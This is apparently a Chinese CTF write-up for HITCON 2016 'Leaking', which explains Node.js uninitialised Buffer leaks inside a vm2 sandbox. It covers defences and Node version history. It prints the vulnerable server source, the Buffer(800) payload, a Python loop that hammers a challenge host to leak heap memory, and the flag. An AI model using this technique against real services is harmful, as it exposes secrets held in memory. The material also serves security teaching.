---
title: "[HITCON 2016] Leaking：Node.js 未初始化 Buffer 与 vm2 沙箱里的内存泄露"
date: 2026-11-23 16:00:00
updated: 2026-11-23 16:00:00
categories:
  - CTF
  - Web
  - Node.js
tags:
  - Node.js
  - Buffer
  - 未初始化内存
  - 内存泄露
  - vm2
  - 沙箱
  - Express
  - eval
  - 源码泄露
  - HITCON
description: 源码里 flag 被 eval 塞进一个随机变量名，正常访问根本拿不到。真正的突破口是旧版 Node.js 的 Buffer(800)：它分配的是未初始化内存，而 res.send("eval ->" + vm.run(...)) 又把这个 Buffer 按 UTF-8 拼进响应，于是把堆里的残留数据一起吐了出来。请求一次不够，要循环刷，直到内存里那块 flag 字符串被 Buffer 撞上。
difficulty: 入门
topic: Node.js 安全
series: Node.js 安全
series_order: 1
permalink: 2026/11/23/web-ctf-hitcon2016-leaking/
---

{% note primary %}
**一分钟速览**

- **难度**：入门偏进阶（需要一点 JavaScript、Node.js 和 HTTP 基础，但不用会写 Node）
- **考点**：Express 路由、`eval`、vm2 沙箱、Node.js `Buffer`、**未初始化内存泄露**、Buffer 转字符串
- **漏洞**：旧版 Node.js 的 `Buffer(800)` 分配**未初始化**内存；`res.send("eval ->" + buffer)` 把它按 UTF-8 拼进响应
- **绕过限制**：`req.query.data.length <= 12` 限制的是**代码字符串长度**，不是 Buffer 大小；`Buffer(800)` 正好 11 个字符
- **关键 payload**：`/?data=Buffer(800)`
- **方法**：循环请求，直到响应里出现 `hitcon{`
- **结果**：泄露的堆内存里出现 `hitcon{CTF2{4dfc94f2-090c-479d-82d5-6c9bd4593ae7}}`
- **flag**：`CTF2{4dfc94f2-090c-479d-82d5-6c9bd4593ae7}`
- **思考题**：文中有 9 道，答案默认折叠，建议先自己想一遍
{% endnote %}

{% note info %}
**阅读说明**

- **前置知识**：JavaScript 基本语法、HTTP 的 query string、`require` / Express 大致在干什么。不会 Node.js 也没关系，正文会逐行解释。
- **工具**：浏览器 / `curl`、Python + `requests`
- **环境**：文中的靶场地址是当时的临时环境，现在多半已经失效，请换成自己的靶场或本地环境
- **版本前提**：这道题依赖**旧版 Node.js（8.0 之前）**的 `Buffer` 行为。新版 Node 已经默认零填充，打法会变，后面“知识点补充”里会说
- 本文所有操作仅用于**授权靶场和本地环境**，请勿对未授权的目标做任何测试
{% endnote %}

{% note default %}
**做题路线**

`访问 /` → `没带 data，拿到源码` → `读 eval 那行，发现 flag 被塞进随机变量` → `看长度限制 <= 12` → `想到 Buffer` → `构造 Buffer(800)` → `循环请求` → `响应里搜 hitcon{` → `拿 flag`
{% endnote %}

## 先看题目：它把源码直接送给你了

这道题最舒服的一点是：**不给源码，但源码可以自己拿。**

直接访问首页，不传 `data`：

```text
http://<靶场地址>/
```

响应就是服务端源码：

![访问首页拿到的源码](01-source.png)

*图 1：不带 `data` 参数时，`else` 分支用 `fs.readFileSync(__filename)` 把当前文件读了回来*

```javascript
"use strict";

var randomstring = require("randomstring");
var express = require("express");
var {
    VM
} = require("vm2");
var fs = require("fs");

var app = express();
var flag = require("./config.js").flag

app.get("/", function(req, res) {
    res.header("Content-Type", "text/plain");

    /*    Orange is so kind so he put the flag here. But if you can guess correctly :P    */
    eval("var flag_" + randomstring.generate(64) + " = \"hitcon{" + flag + "}\";")
    if (req.query.data && req.query.data.length <= 12) {
        var vm = new VM({
            timeout: 1000
        });
        console.log(req.query.data);
        res.send("eval ->" + vm.run(req.query.data));
    } else {
        res.send(fs.readFileSync(__filename).toString());
    }
});

app.listen(3000, function() {
    console.log("listening on port 3000!");
});
```

这段代码不长，但信息量很大。先把几个关键点圈出来：

- **flag 被 `eval` 拼进了一个随机变量名**：`flag_` + 64 位随机字符串；
- **`data` 长度不能超过 12**，超了就走 `else`，把源码还给你；
- **`data` 会交给 vm2 沙箱执行**，结果拼在 `"eval ->"` 后面返回；
- **`else` 分支会读自己的源码**，这就是图 1 的来源。

接下来逐行拆。

## 逐行读源码

### `require`、解构和 Express

```javascript
var randomstring = require("randomstring");
var express = require("express");
var { VM } = require("vm2");
var fs = require("fs");
```

`require` 相当于 C 的 `include`，但它不是文本拷贝，而是**加载一个模块，把模块导出的对象返回给你**。

- `randomstring`：生成随机字符串，这里用来生成 64 位的变量名后缀；
- `express`：Web 框架，用来开 HTTP 服务和写路由；
- `vm2`：一个“沙箱”库，用来在受控环境里执行不可信代码；
- `fs`：file system，读写文件。

`var { VM } = require("vm2");` 是**解构赋值**：

```javascript
// 等价于
var 临时对象 = require("vm2");
var VM = 临时对象.VM;
```

`require("vm2")` 返回的对象大概长这样：

```javascript
{
    VM: 某个构造函数,
    其他属性: ...
}
```

我们只关心 `VM`，所以直接把它“拆”出来。

```javascript
var app = express();
var flag = require("./config.js").flag
```

`express()` 创建一个 Web 应用对象；`require("./config.js")` 加载同目录下的 `config.js`，取出它导出的 `flag`。

`./` 表示“当前目录”，这是 Node 里相对路径的写法。

### 路由和请求对象

```javascript
app.get("/", function(req, res) {
    res.header("Content-Type", "text/plain");
    // ...
});
```

`app.get("/", handler)` 的意思是：当有人用 GET 访问 `/` 时，调用 `handler`。`handler` 是一个回调函数，请求来了才会执行。

- `req`：request，请求对象，里面有 URL、query、请求头、body 等；
- `res`：response，响应对象，用来设置响应头、返回内容。

`res.header("Content-Type", "text/plain")` 把响应类型设成纯文本。所以后面无论我们泄露出来的是什么字节，浏览器/`requests` 都会当成文本收。

### eval 那一行：flag 被藏进了随机变量

```javascript
eval("var flag_" + randomstring.generate(64) + " = \"hitcon{" + flag + "}\";")
```

`eval` 会把字符串当**代码**执行。这一行在运行时拼出来的代码是：

```javascript
var flag_aB3dE9...（64 位随机） = "hitcon{CTF2{...}}";
```

也就是说，每个请求都会：

1. 生成一个 64 位随机后缀；
2. 拼出一个新的变量名 `flag_xxx`；
3. 把 flag 包成 `hitcon{...}`，赋值给这个变量。

注释写得很嚣张：

```text
Orange is so kind so he put the flag here. But if you can guess correctly :P
```

你猜得到那个 64 位随机变量名吗？猜不到。所以就别猜了。

### 长度限制：限制的是“代码长度”

```javascript
if (req.query.data && req.query.data.length <= 12) {
```

`req.query` 是 Express 解析出来的 query string 对象。访问 `/?data=hello` 时：

```javascript
req.query       // { data: "hello" }
req.query.data  // "hello"
```

`.length` 是**字符串的长度**，也就是我们传给它的那段 JavaScript 代码有多少个字符。

```javascript
if (req.query.data && req.query.data.length <= 12) {
    // 代码不超过 12 个字符，送进沙箱执行
} else {
    // 否则把源码还给你
}
```

注意：**限制的是代码的长度，不是代码运行时分配的 Buffer 大小。** 这就是后面绕过的关键。

### vm2 沙箱

```javascript
var vm = new VM({
    timeout: 1000
});
res.send("eval ->" + vm.run(req.query.data));
```

`new VM({ timeout: 1000 })` 创建一个沙箱，超时 1 秒。`vm.run(code)` 在沙箱里执行代码，并返回**最后一个表达式的结果**。

最后 `res.send("eval ->" + 结果)` 把结果拼成字符串返回。

如果 `data` 没传，或者长度超过 12，就走：

```javascript
res.send(fs.readFileSync(__filename).toString());
```

`__filename` 是当前正在运行的 JS 文件的路径，`readFileSync` 把它整个读出来。于是我们拿到了源码。

{% note think **思考 01｜`"use strict"` 到底改变了什么？flag 变量为什么“藏”起来了？** %}
`"use strict"` 是严格模式。它是一段**指令**，写在模块最上面，会让整个模块（包括里面定义的函数）都按严格模式执行。

严格模式里有一个和 `eval` 有关的行为：**直接 `eval` 里的 `var` 声明，不会泄漏到调用它的函数作用域里**，而是被关在 `eval` 自己的变量环境里。

对比一下：

```javascript
// 非严格模式
function f() {
    eval("var x = 1");
    console.log(x); // 1，x 泄漏到了 f 里
}

// 严格模式
function f() {
    "use strict";
    eval("var x = 1");
    console.log(x); // ReferenceError，x 只活在 eval 里
}
```

所以 `flag_xxx` 不会出现在路由回调的局部变量里。**但这只是让它“更藏”，并不是这题的核心。** flag 的字符串内容仍然实打实地存在于内存里，后面 `Buffer` 泄露的就是这块内存。
{% endnote %}

{% note think **思考 02｜既然 flag 在 eval 里，为什么不能直接访问 `flag_xxx`？** %}
两个原因：

1. **名字猜不到**：后缀是 64 位随机字符，硬猜不现实；
2. **作用域够不着**：严格模式下 `flag_xxx` 只存在于 `eval` 内部；就算你把名字猜对了，`vm.run` 里的代码运行在另一个上下文里，也读不到路由回调的局部变量。

所以正常路子是走不通的。出题人就是想逼你去“读内存”，而不是“读变量”。

注释里那句 “if you can guess correctly” 更像是挑衅：你猜一个试试？
{% endnote %}

## 关键漏洞：Buffer 泄露未初始化内存

现在来看真正的突破口。

### `Buffer` 是什么

`Buffer` 是 Node.js 里处理二进制数据的核心对象。你可以把它理解成一块**定长的字节数组**：

```javascript
Buffer(8)   // 一块 8 字节的内存
```

在**旧版 Node.js（8.0 之前）** 里，`Buffer(n)` / `new Buffer(n)` 只是按大小分配一块内存，**不会清零**。也就是说，这块内存里是什么，取决于之前谁用过它。

这些残留可能是：

- 之前创建过的字符串；
- 之前释放掉的对象；
- 堆里其他请求留下的数据。

而 flag 的字符串，正好就在堆里。

### 为什么 `Buffer(800)` 能过长度限制

`Buffer(800)` 这个字符串有多少个字符？数一下：

```text
B(1) u(2) f(3) f(4) e(5) r(6) ((7) 8(8) 0(9) 0(10) )(11)
```

**11 个字符**，小于等于 12，正好能过。

这里最容易被误导的地方是：`req.query.data.length` 限制的是**你发过去的这段代码的字面长度**，而不是代码执行时申请了多少内存。`800` 只是个参数，它不会让代码字符串变长。

### 为什么结果能变成字符串

```javascript
res.send("eval ->" + vm.run(req.query.data));
```

`vm.run("Buffer(800)")` 返回一个 `Buffer` 对象。`"eval ->" + buffer` 会触发 JavaScript 的**类型转换**：把 `Buffer` 转成原始值。

Node 的 `Buffer` 重写了 `toString`，默认按 **UTF-8** 解码。所以：

```text
Buffer 里的原始字节  →  UTF-8 解码  →  JavaScript 字符串  →  写进响应
```

如果内存里有 ASCII 的 `hitcon{...}`，它会原样出现在响应里。如果遇到非 UTF-8 字节，会被替换成 `�`（也就是 UTF-8 的 `EF BF BD`），所以泄露结果里会有一大堆 `\xef\xbf\xbd`，但不影响我们找 ASCII 部分。

### 为什么请求一次不够

`Buffer(800)` 读到的是**那一刻堆里的残留**。堆的布局每次都可能不同：

- 这次分配的 800 字节可能正好撞上 flag 字符串；
- 下次可能撞上的是一堆别的垃圾。

所以只请求一次，大概率看不到 flag。**要循环刷。** 而且每请求一次，`eval` 都会重新把 flag 拼进堆里，相当于不断给内存“加料”，被撞上的概率就上来了。

{% note think **思考 03｜`req.query.data.length <= 12` 限制的到底是什么？为什么 `Buffer(800)` 能过？** %}
限制的是 `req.query.data` 这个**字符串**的长度，也就是我们发过去的 JavaScript 源码有多少个字符。

`Buffer(800)` 一共 11 个字符：

```text
Buffer(800)
12345678901
```

它执行时确实会分配 800 字节，但“800 字节”是运行时的参数，不是代码字符串的长度。所以 11 <= 12，放行。

换成 `new Buffer(800)` 就不行了，它是 15 个字符，直接掉进 `else`，只会把源码还给你。
{% endnote %}

{% note think **思考 04｜为什么 `Buffer(800)` 能把 flag“读”出来？** %}
因为旧版 Node 的 `Buffer(n)` **不初始化内存**，只是 `malloc` 一块出来，里面的内容是上一次使用这块内存留下的数据。

flag 在内存里至少有两份痕迹：

1. `eval` 拼出来的**源码字符串**：`var flag_xxx = "hitcon{...}";`
2. `eval` 执行时创建的**字符串值**：`"hitcon{...}"`。

`eval` 返回后，这些字符串变成垃圾，它们占过的堆内存可以被后续分配复用。随后 `Buffer(800)` 申请内存，碰到这些残留，就把 flag 一起读出来了。

这不是“越界读”，而是“读了没清零的内存”。经典程度和 Heartbleed 有点像：都是把不属于本次逻辑的内存内容吐给了外部。
{% endnote %}

{% note think **思考 05｜为什么必须循环请求？一次不行吗？** %}
不行，因为 `Buffer(800)` 读到什么**取决于堆的当前状态**，不是确定性的。

一次请求里：

1. `eval` 把 flag 写进堆；
2. 接着创建 `VM`、执行 `vm.run("Buffer(800)")`；
3. `Buffer` 申请 800 字节，可能落在有 flag 的块，也可能落在别的地方。

这次没中，下次可能中。循环请求就是不断重新洗牌，直到某一次分配正好覆盖到那段字符串。

另外，每请求一次都会重新执行一遍 `eval`，flag 字符串在堆里出现得更频繁，也会提高命中率。
{% endnote %}

{% note think **思考 06｜vm2 是沙箱，为什么沙箱里能调用 `Buffer`？** %}
因为沙箱里并不是一个“什么都没有”的 JS 环境。这个版本的 vm2 把一些**宿主（Node）的全局对象**带进了沙箱，`Buffer` 就在其中。

`vm.run("Buffer(800)")` 在沙箱上下文里解析 `Buffer`，解析到了宿主注入的构造函数，于是真的在宿主进程里分配了一块 Buffer。

注意：这里**不需要沙箱逃逸**。我们只是用了沙箱里本来就暴露出来的一个全局函数。真正危险的是“把宿主能力不加限制地塞进沙箱”，而不是我们做了什么高深的逃逸。

（vm2 后来确实爆出过很多真正的逃逸漏洞，2023 年已经停止维护。这个背景放在“知识点补充”里说。）
{% endnote %}

{% note think **思考 07｜`res.send("eval ->" + buffer)` 为什么把内存变成了字符串？** %}
`+` 的左边是字符串，右边是对象。JavaScript 会先把右边转成原始值（ToPrimitive），而 `Buffer` 的 `toString` 默认按 UTF-8 解码。

所以实际发生的是：

```text
Buffer(800)  →  buffer.toString('utf8')  →  "..."  →  "eval ->" + "..."  →  res.send(...)
```

ASCII 部分（比如 `hitcon{...}`）原样保留；非 UTF-8 的字节被替换成 `�`。所以你看到的泄露结果里会夹杂大量 `\xef\xbf\xbd`，那是替换字符的 UTF-8 编码。

如果代码写的是 `res.send(vm.run(...))`，Express 对 Buffer 的处理会不一样（可能直接按二进制发），泄露的观感会变。这里刚好是先拼字符串，把 Buffer 强制转成了文本。
{% endnote %}

## 写脚本

思路很直接：构造 `?data=Buffer(800)`，循环请求，直到响应里出现 `hitcon{`。

```python
import re
import requests

url = "http://afeb3837aab45836515fe5e2.http-ctf2.dasctf.com/?data=Buffer(800)"

for i in range(1, 1000):
    r = requests.get(url, timeout=5)
    if b"hitcon{" in r.content:
        print(f"[+] 第 {i} 次命中")
        print(r.content)
        m = re.search(rb"CTF2\{[^}]+\}", r.content)
        if m:
            print("[+] flag =", m.group().decode())
        break
```

几个细节：

- 用 `r.content`（bytes）而不是 `r.text`，直接搜 `b"hitcon{"`，不用管编码问题；
- 服务端会把平台 flag 包一层：`hitcon{CTF2{...}}`，所以搜 `hitcon{` 最稳；
- 真正要提交的是里面的 `CTF2{...}`，用正则单独抠出来；
- 循环上限设个几千次，通常几十次内就能中；
- 如果括号被某些代理/客户端吃掉，可以把 payload 编码成 `Buffer%28800%29`，服务端解码后还是 `Buffer(800)`。

{% note think **思考 08｜为什么不用 `new Buffer(800)` 或 `Buffer.alloc(800)`？** %}
三者的字符长度和安全性都不一样：

| 写法 | 字符数 | 能不能过 12 | 会不会泄露 |
| --- | --- | --- | --- |
| `Buffer(800)` | 11 | ✅ | ✅ 旧版不初始化 |
| `new Buffer(800)` | 15 | ❌ | 会，但根本发不进去 |
| `Buffer.alloc(800)` | 17 | ❌ | ❌ 会清零 |
| `Buffer.allocUnsafe(800)` | 23 | ❌ | ✅ 但发不进去 |

`new Buffer(800)` 虽然也能分配未初始化内存，但它有 15 个字符，超过 12，直接走 `else` 返回源码。

`Buffer.alloc(800)` 是安全 API，**会清零**，就算能发进去也读不到东西。

所以 `Buffer(800)` 不是随便挑的——它是“长度 <= 12”和“不初始化”两个条件同时满足的写法。
{% endnote %}

{% note think **思考 09｜长度限制是 12，能不能一次泄露更多？** %}
可以换大一点的 Buffer，但字符数不能超：

```text
Buffer(9999)   # 12 个字符，正好卡线
Buffer(1e3)    # 11 个字符，等于 1000
Buffer(1e4)    # 11 个字符，等于 10000
```

`Buffer(9999)` 是 12 个字符，刚好过；`Buffer(1e4)` 更短，但分配 10000 字节。理论上泄露的字节越多，命中 flag 的概率越高。

但也不是越大越好：

- 超大分配可能失败或拖慢服务；
- 不同的分配大小会落到不同的堆区域，未必更容易撞上 flag；
- 题目环境通常对请求有超时/频率限制。

原来那篇 writeup 用 800 能打通，就说明 800 这个大小已经够用了。真的打不动时，可以按 `800 → 999 → 4096 → 9999` 依次试。
{% endnote %}

## 跑出来

跑脚本，命中的那一次响应类似这样：

![泄露结果](02-leak.png)

*图 2：响应里混着大量 `\xef\xbf\xbd`，中间夹着完整的 `hitcon{CTF2{...}}`*

```text
b'eval ->p\xef\xbf\xbd\xef\xbf\xbd...\x00hitcon{CTF2{4dfc94f2-090c-479d-82d5-6c9bd4593ae7}}...
```

拆开看：

| 片段 | 含义 |
| --- | --- |
| `eval ->` | 服务端自己拼的前缀 |
| `p\xef\xbf\xbd\xef\xbf\xbd...` | 未初始化的堆内存，非 UTF-8 字节被替换成 `�` |
| `hitcon{CTF2{...}}` | 我们要的 flag，被 `hitcon{}` 包了一层 |
| 一堆 `\x00` 和乱码 | 其他残留数据，不用管 |

拿到 flag：

```text
CTF2{4dfc94f2-090c-479d-82d5-6c9bd4593ae7}
```

## 知识点补充

### 1. Node.js Buffer 的几种分配方式

| 写法 | 初始化 | 说明 |
| --- | --- | --- |
| `Buffer(n)` | ❌（旧版） | 直接分配，不清零；Node 8.0 起改为清零 |
| `new Buffer(n)` | ❌（旧版） | 同上，已废弃 |
| `Buffer.alloc(n)` | ✅ | 分配并用 0 填充，安全 |
| `Buffer.allocUnsafe(n)` | ❌ | 明确不初始化，性能优先，**必须自己写满** |
| `Buffer.from(data)` | ✅ | 从已有数据创建，内容确定 |

历史背景：

- 早期 Node 的 `new Buffer(n)` 为了性能不清零，导致过不少“未初始化内存泄露”；
- Node 8.0.0 起，`Buffer(n)` / `new Buffer(n)` 默认零填充；
- `new Buffer()` 后来被标记为废弃，官方推荐 `Buffer.alloc` / `Buffer.from` / `Buffer.allocUnsafe`。

安全写法只有三种：

```javascript
Buffer.alloc(800)          // 安全，清零
Buffer.from("hello")       // 安全，内容确定
Buffer.allocUnsafe(800)    // 只在你会完整覆盖它的时候用
```

### 2. 未初始化内存为什么能泄露

进程刚启动时，操作系统给的页通常是清零的。但**堆是进程内部反复复用的**：

```text
malloc(800) → 使用 → free → 这块内存回到空闲链表
malloc(800) → 可能又拿到同一块 → 里面还是上一次的数据
```

所以“未初始化”不等于“全是 0”，而是“上一次谁用过，就留下谁的痕迹”。

常见的泄露源：

- 刚释放的字符串 / 对象；
- 上一个请求的临时数据；
- 密钥、token、flag 这类本来不该出现在响应里的东西。

这和 **Heartbleed（CVE-2014-0160）** 是同一类问题：程序把一块“不属于本次输出”的内存原样发了出去。

### 3. vm2 沙箱：它能做什么，不能做什么

`vm2` 的设计目标是：在同一个进程里，用 V8 的独立上下文执行不可信代码，并限制超时、内存、`require` 等能力。

```javascript
const vm = new VM({ timeout: 1000 });
vm.run("1 + 1"); // 2
```

但它有两个现实问题：

1. **默认可能暴露宿主能力**：`Buffer`、`console` 等对象如果被带进沙箱，攻击者就能用它们做沙箱外的事；
2. **逃逸漏洞很多**：vm2 历史上出现过多次沙箱逃逸（包括 2023 年的几个严重 CVE），项目已于 2023 年停止维护。

所以：

| 场景 | 建议 |
| --- | --- |
| 执行不可信代码 | 不要用 `eval`，也不要把 vm2 当安全边界 |
| 必须隔离 | 独立进程 / 容器 / `isolated-vm` / Worker，配合权限和资源限制 |
| 只是跑表达式 | 用 AST 解析 + 白名单，不要直接 `eval` |

这道题不需要逃逸，因为 `Buffer` 已经被“送”进沙箱了。

### 4. Express 基础速查

| 代码 | 作用 |
| --- | --- |
| `var app = express()` | 创建应用 |
| `app.get("/", handler)` | 注册 GET 路由 |
| `req.query` | 解析后的 query string 对象 |
| `req.query.data` | 取 `data` 参数 |
| `res.header(name, value)` | 设置响应头 |
| `res.send(x)` | 发送响应，自动处理字符串/Buffer/对象 |
| `app.listen(3000)` | 监听端口 |

`require` 也不是简单的文本包含：

- 每个模块有自己的作用域；
- `module.exports` 决定导出什么；
- 同一个模块只会执行一次，之后走缓存。

### 5. eval、strict mode 和作用域

`eval` 有两种：

| 类型 | 例子 | `var` 去哪 |
| --- | --- | --- |
| 直接 eval | `eval("var x = 1")` | 调用者的作用域（非严格）/ eval 自己的环境（严格） |
| 间接 eval | `var e = eval; e("var x = 1")` | 全局作用域 |

这题是直接 eval，外层又是严格模式，所以 `flag_xxx` 不会泄漏到路由回调里。

但**严格模式不是安全措施**：它只是限制了变量作用域，内存里的字符串并不会因此消失。

### 6. Buffer 转字符串：UTF-8 与替换字符

`Buffer.prototype.toString()` 默认 `utf8`。遇到不合法的 UTF-8 序列时，会替换成 `U+FFFD`（`EF BF BD`）。

这就是为什么泄露结果里到处是：

```text
\xef\xbf\xbd
```

如果你想更“原汁原味”地看内存，可以试试：

```javascript
Buffer(800).toString('latin1')   // 每个字节映射到一个字符，不丢信息，但长度 25，过不了限制
```

在这题的长度限制下，`Buffer(800)` 只能用默认的 `toString`，所以乱码就乱码吧，ASCII 的 flag 不受影响。

### 7. 信息泄露类题目的常见思路

| 类型 | 典型来源 | 思路 |
| --- | --- | --- |
| 源码泄露 | 备份文件、`.git`、本题的 `else` | 先拿源码，再找逻辑漏洞 |
| 报错泄露 | debug 页面、异常堆栈 | 构造异常，看路径、变量、版本 |
| 内存泄露 | 未初始化 Buffer、Heartbleed | 读不属于本次逻辑的内存 |
| 元数据泄露 | `Server`、`X-Powered-By` | 指纹识别，找对应 CVE |
| 侧信道 | 盲注、时序 | 用布尔/时间差推断内容 |

这道题把“源码泄露”和“内存泄露”串在了一起：先用 `else` 拿源码，再从源码里找到 `Buffer` 这个泄露点。

### 8. 怎么防

| 问题 | 防御 |
| --- | --- |
| 未初始化内存 | 用 `Buffer.alloc` / `Buffer.from`，禁止 `Buffer(n)` |
| 把 secret 拼进代码 | 不要 `eval` 拼接用户/敏感数据，改用参数或查表 |
| 沙箱暴露宿主能力 | 最小化沙箱全局对象，不要透传 `Buffer`、`process`、`require` |
| 沙箱本身不可靠 | 用进程/容器隔离，别把 vm2 当唯一防线 |
| 密钥留在堆里 | 减少不必要的字符串拷贝，及时清理（但 GC 不保证） |

### 9. 如果 Node 是新版，这题会怎样

新版 Node（8.0+）的 `Buffer(n)` 默认清零，`Buffer(800)` 就泄露不出东西了。

那还能怎么打？

- 找别的未初始化内存点（`Buffer.allocUnsafe`，但长度不够）；
- 找 vm2 的沙箱逃逸，直接读宿主变量或文件；
- 利用错误信息、原型链、`constructor` 等技巧；
- 题目如果还用了 `eval`，也可能有别的注入面。

这题是 2016 年的题，环境就是旧版 Node，所以 `Buffer(800)` 是正解。

## 几个容易踩的坑

| # | 坑 | 现象 | 正确做法 |
| --- | --- | --- | --- |
| 1 | 用 `new Buffer(800)` | 长度 15，超过 12，只返回源码 | 用 `Buffer(800)` |
| 2 | 用 `Buffer.alloc(800)` | 长度 17 且会清零 | 旧版 Node 用 `Buffer(800)` |
| 3 | 只请求一次 | 大概率是乱码，没有 flag | 循环请求 |
| 4 | 搜 `CTF2{` 却漏了外层 | 服务端返回的是 `hitcon{CTF2{...}}` | 搜 `hitcon{`，再正则抠 `CTF2{...}` |
| 5 | 用 `r.text` 处理乱码 | 编码转换可能丢字节 | 用 `r.content`（bytes）搜 |
| 6 | 以为长度限制是 Buffer 大小 | 不敢写 `Buffer(800)` | 限制的是代码字符串长度 |
| 7 | 在新版 Node 上复现 | `Buffer` 清零，什么都读不到 | 用旧版 Node 或题目环境 |
| 8 | 括号被 URL 处理掉 | 服务端收到不完整代码 | 编码成 `Buffer%28800%29` |
| 9 | 以为要沙箱逃逸 | 想复杂了 | 这个版本直接能调 `Buffer` |

## 完整流程速查

| 步骤 | 目的 | 操作 | 结果 |
| --- | --- | --- | --- |
| 1 | 拿源码 | 访问 `/`，不带 `data` | `else` 分支返回源码 |
| 2 | 找泄露点 | 读 `eval` 和 `Buffer` | flag 在堆里，`Buffer(n)` 不初始化 |
| 3 | 看限制 | `data.length <= 12` | 限制代码长度，不是内存大小 |
| 4 | 构造 payload | `?data=Buffer(800)` | 11 个字符，正好过 |
| 5 | 循环请求 | `requests.get` 多次 | 让堆不断重排 |
| 6 | 搜特征 | `b"hitcon{" in r.content` | 命中泄露 |
| 7 | 提 flag | 正则 `CTF2\{[^}]+\}` | 拿到平台 flag |

## 小结

这道题表面是“Node.js 代码审计”，真正考的是一条很老但很经典的链路：

- **源码泄露**：`else` 分支把 `__filename` 读出来，白给源码；
- **`eval` 藏 flag**：随机 64 位变量名 + 严格模式，正常访问拿不到；
- **长度限制的误读**：`data.length <= 12` 限制的是代码字符串，不是 Buffer 大小；
- **未初始化 Buffer**：旧版 `Buffer(800)` 不清零，把堆里的残留读出来；
- **类型转换**：`"eval ->" + Buffer` 触发 UTF-8 解码，把内存变成响应；
- **概率泄露**：堆布局不确定，所以要循环刷。

真正容易卡住的地方不是“会不会 Node”，而是敢不敢把 `Buffer(800)` 发出去：**看到长度限制就以为只能写很短的东西，忘了运行时参数不受这个限制。**

最后留三个问题，你可以自己想一想：

1. 如果长度限制从 12 放宽到 20，你会选 `new Buffer(800)`、`Buffer.allocUnsafe(800)`，还是别的写法？为什么？
2. 如果这题跑在新版 Node 上，`Buffer(800)` 已经清零，你还能从源码里找到别的泄露面吗？
3. 为什么泄露结果里大量是 `\xef\xbf\xbd`？如果能让服务端用 `latin1` 转字符串，泄露内容会有什么变化？

下一步可以顺着两个方向走：一是 Node.js 安全（原型链污染、沙箱逃逸、`child_process` 注入），二是内存类漏洞（Heartbleed、未初始化栈/堆、越界读）。把“程序把不该给的内存给了你”这条线想清楚，很多信息泄露题都是同一个味道。
